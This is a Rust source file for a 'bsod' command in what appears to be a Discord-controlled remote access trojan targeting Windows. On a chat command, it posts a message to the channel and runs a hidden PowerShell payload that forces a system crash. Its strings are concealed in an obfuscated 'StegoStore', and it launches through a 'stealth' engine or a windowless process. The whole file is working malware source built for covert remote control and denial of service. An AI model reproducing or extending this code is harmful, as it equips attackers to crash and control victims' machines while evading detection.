use crate::commands::*;
use crate::core::http_client::HttpClient;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use twilight_model::channel::message::Message;
use std::sync::Arc;
use std::process::Command;
use std::os::windows::process::CommandExt;

pub struct BsodCommand;

#[async_trait]
impl BotCommand for BsodCommand {
    fn name(&self) -> &str { "bsod" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "BSOD").into_boxed_str())
    }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str {
        Box::leak(StegoStore::get(StringCategory::System, "BSOD_USAGE").into_boxed_str())
    }
    fn examples(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(StegoStore::get(StringCategory::System, "BSOD_ALT_CODE").into_boxed_str()) as &str,
            Box::leak(StegoStore::get(StringCategory::System, "BSOD_EX1").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }
    fn aliases(&self) -> &'static [&'static str] {
        Box::leak(vec![
            Box::leak(StegoStore::get(StringCategory::Desc, "BSOD_ALIAS").into_boxed_str()) as &str,
        ].into_boxed_slice())
    }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let code_str = StegoStore::get(StringCategory::System, "BSOD_ALT_CODE");
        let code_str = args.next().unwrap_or_else(|| Box::leak(code_str.into_boxed_str()));

        let trig_msg = StegoStore::get(StringCategory::System, "BSOD_TRIG").replace("{}", code_str);
        http.create_message(msg.channel_id.get(), &trig_msg).await?;

        // Give a moment for the message to send
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;

        let ps_template = StegoStore::get(StringCategory::Scripts, "BSOD_CS");
        let ps_command = format!("{}; [CS]::K()", ps_template.replace("__CODE__", code_str));

        let ps_exe = StegoStore::get(StringCategory::Const, "PS_EXE");
        if let Some(engine) = crate::stealth::get_engine() {
            let _ = engine.execute_stealth_ps(&ps_command);
        } else {
            Command::new(&ps_exe)
                .arg(&StegoStore::get(StringCategory::System, "SCREEN_PS_CMD"))
                .arg(&ps_command)
                .creation_flags(0x08000000) // CREATE_NO_WINDOW
                .spawn()?;
        }

        Ok(())
    }
}
